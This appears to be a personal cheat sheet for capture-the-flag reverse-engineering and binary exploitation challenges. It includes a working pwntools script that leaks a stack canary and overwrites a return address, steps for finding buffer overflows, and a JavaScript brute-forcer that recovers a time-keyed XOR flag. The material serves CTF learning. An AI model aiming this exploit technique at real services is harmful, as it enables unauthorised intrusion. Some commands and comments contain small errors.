# REV-PWNS
my personal guide for rev-pwns

------------------------------------------------------------------------------------------------------------------------
when you have a challenge with NO PIE and a canary
1. checksum --file=/home/kali/<thefile>
2. here its the solution.py :

from pwn import *
context.log_level = "DEBUG"
context.arch = "amd64"
context.os = "linux"

remote_ip = 'localhost'
remote_port = 1337
buffer_len = 8 * 11
addr_your_goal = 0x401339 # it depends.

r = remote(remote_ip, remote_port)
r.recv() # Receive question for name;
r.sendline(b"A" * buffer_len)
r.recv() # Receive the first response;
x = r.recv() # Receive canary;

canary = x[x.rfind(b'A')+1:x.rfind(b'A')+9] # Canary leak

exploit = b"A" * buffer_len + b"\x00" + canary[1:] + 8 * b"\x00" + p64(addr_your_goal) # Overwrite buffer followed by canary, rbp and return address which is not position independent;
r.send(exploit) # Sending payload;
x = r.recv() # Receive flag from your_goal function;
flag = x[:x.find(b'}')]
print(flag)



------------------------------------------------------------------------------------------------------------------------
when you have a "file" type and an IP:port -->
1. nc IP port (so you can try the program)         or use this for a more interactive shell: rlwrap nc <host> <port>
2. checksum --file=/home/kali/<thefile>  (to see if there is a canary)
3. now load the file to ghidra  (or objdump -t <filename>) 
4. There we go to the main functio non "Listing" window and go to the main and then open a "window" --> "Decompile: ...."
   so we can check the main function. Then go to other functions too.
!!!------- if you find "gets()" for input, without boundary checking, that means that you can buffer overflow it (EIP (Extended Instruction Pointer)---------!!!
5. go check the input, try 100 A's and then 200 A's...and you may find if there is a baffer overflow.
                            simple input tries-->
6. python3 -c "print(b'A'*200)" | ./<filename>
7. 

-------------------------------------------------------------------------------------------------------------------------
when you have a "file" without an IP:port-->
1. checksum
2. strings
3. ghidra or ida free  (cd opt/inda-free/ and then ./ida)
4. hecdump <filename>.enc


-----------------------------------------------------------------------------------------------------------------------
if you get a file with ARM code (Advanced RISC Machine, used for mobiles,servers,Raspberry Pi etc)
1. nc ip port
2. you need a code to solve the inputs of it:
   https://github.com/itwaseasy/crackmes-solutions/blob/master/hackTheBox/arms_race/emulator.py
   This script is a remote challenge solver using ARM code emulation. It connects to a remote service, receives ARM machine    
   code, emulates its execution, and returns the result (the value in register R0)

--------------------------------------------------------------------------------------------------------------------------
you just can a flag/text with scrambled chars. It encrypts them based on the time/date and month at that moment. So:

import MD5 from 'crypto-js/md5.js';
let daysBack = 0;

#use this flag from where you got it
const flag = [0x45, 0x00, 0x50, 0x39, 0x08, 0x6f, 0x4d, 0x5b, 0x58, 0x06, 0x66, 0x40, 0x58, 0x4c, 0x6d,0x5d, 0x16, 0x6e, 0x4f, 0x00, 0x43, 0x6b, 0x47, 0x0a,0x44, 0x5a, 0x5b, 0x5f, 0x51, 0x66, 0x50, 0x57]
const ctfDay = new Date("2025-04-11");

#use this to clear the unwanted chars
const canBeFlag = (flag) => [...flag].every(x => x.charCodeAt(0) >= 48 && x.charCodeAt(0) <= 125)


#try for the previus 100 days
while (daysBack < 100) {
    for(let minute = 0; minute < 24 * 60; minute++) {
        const dateTime = new Date(ctfDay.getTime() - daysBack * 24 * 60 * 60 * 1000 + minute * 60 * 1000);
        const date = `${(dateTime.getMonth() + 1).toString().padStart(2, '0')}/${dateTime.getDate().toString().padStart(2, '0')}/${dateTime.getFullYear()}`
        const time = `${dateTime.getHours().toString().padStart(2, '0')}:${dateTime.getMinutes().toString().padStart(2, '0')}`
        const base = "Europe/Warsaw-" + date + "-" + time;
         # i used europe/warsaw cayse that was the place the flag used for first time
   
        var hash = MD5(base).toString();
        const result = flag.map((x, i) => String.fromCharCode(x ^ hash.charCodeAt(i))).join('')
        if(canBeFlag(result))
            console.log(result);
    }

    daysBack++;
}
